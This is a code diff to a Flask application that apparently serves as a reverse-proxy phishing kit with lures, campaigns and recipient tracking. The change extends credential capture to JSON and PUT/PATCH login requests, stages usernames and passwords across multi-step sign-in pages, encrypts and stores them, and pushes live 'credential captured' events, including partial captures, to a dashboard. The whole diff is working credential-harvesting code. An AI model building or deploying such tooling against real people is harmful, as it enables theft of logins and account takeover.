@@ -70,6 +70,7 @@ from .detection import build_visit_record, evaluate
 from .lures import LURE_REGISTRY, list_templates, render_lure
 from .proxy import (
     extract_credentials,
+    extract_credentials_json,
     encrypt_credentials,
     encrypt_session_data,
     extract_session_tokens,
@@ -430,12 +431,37 @@ def create_app(cfg: Config | None = None) -> Flask:
         sess_id = request.cookies.get("csession", str(uuid.uuid4()))
         body = request.get_data() if request.method in ("POST", "PUT", "PATCH") else None
 
-        if request.method == "POST" and request.content_type and "form" in request.content_type:
-            form_data = dict(request.form)
-            username, password, has_creds = extract_credentials(form_data)
+        if request.method in ("POST", "PUT", "PATCH") and body:
+            content_type = request.content_type or ""
+            username = ""
+            password = ""
+            raw_fields: dict[str, str] = {}
+            has_creds = False
+
+            if "json" in content_type:
+                username, password, raw_fields, has_creds = extract_credentials_json(body)
+            elif "form" in content_type:
+                raw_fields = dict(request.form)
+                username, password, has_creds = extract_credentials(raw_fields)
+
             if has_creds:
+                staged = session.get("_bpp_staged_creds", {})
+
+                if username and not staged.get("username"):
+                    staged["username"] = username
+                if password and not staged.get("password"):
+                    staged["password"] = password
+                if raw_fields:
+                    prev_raw = staged.get("raw_fields", {})
+                    prev_raw.update(raw_fields)
+                    staged["raw_fields"] = prev_raw
+
+                final_username = staged.get("username", username)
+                final_password = staged.get("password", password)
+                all_raw = staged.get("raw_fields", raw_fields)
+
                 u_enc, p_enc, f_enc = encrypt_credentials(
-                    username, password, form_data, cfg.encryption_key
+                    final_username, final_password, all_raw, cfg.encryption_key
                 )
                 cred_record = {
                     "session_id": sess_id,
@@ -453,12 +479,19 @@ def create_app(cfg: Config | None = None) -> Flask:
                 }
                 cred_id = save_credential(cfg, cred_record)
                 session["last_credential_id"] = cred_id
+                session["_bpp_staged_creds"] = staged
 
                 if recipient and tracking_token:
                     record_recipient_click(cfg, tracking_token)
 
+                event_type = "credential_captured"
+                if final_username and not final_password:
+                    event_type = "credential_partial_username"
+                elif final_password and not final_username:
+                    event_type = "credential_partial_password"
+
                 _broadcast_sse({
-                    "event": "credential_captured",
+                    "event": event_type,
                     "ip": ip,
                     "campaign_id": campaign.id,
                     "tracking_token": tracking_token,
@@ -466,8 +499,8 @@ def create_app(cfg: Config | None = None) -> Flask:
                     "timestamp": datetime.now(timezone.utc).isoformat(),
                 })
                 logger.info(
-                    "credential captured: campaign=%s ip=%s token=%s",
-                    campaign.id, ip, tracking_token,
+                    "%s: campaign=%s ip=%s token=%s",
+                    event_type, campaign.id, ip, tracking_token,
                 )
 
         status, resp_headers, resp_body, resp_cookies = proxy_request(
